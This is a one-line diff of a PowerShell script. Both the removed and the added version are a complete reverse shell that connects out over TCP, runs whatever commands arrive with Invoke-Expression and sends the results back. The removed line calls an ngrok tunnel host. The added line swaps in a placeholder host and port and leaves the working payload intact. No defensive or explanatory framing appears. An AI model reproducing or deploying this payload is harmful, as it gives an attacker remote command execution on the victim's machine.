@@ -1,1 +1,1 @@
-$ms=(New-Object Net.Sockets.TCPClient("0.tcp.sa.ngrok.io",18267)).GetStream();[byte[]]$tcbt=0..65535|%{0};while(($i=$ms.Read($tcbt,0,$tcbt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($tcbt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$ms.Write($st,0,$st.Length)}
+$ms=(New-Object Net.Sockets.TCPClient("1234567",3333)).GetStream();[byte[]]$tcbt=0..65535|%{0};while(($i=$ms.Read($tcbt,0,$tcbt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($tcbt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$ms.Write($st,0,$st.Length)}
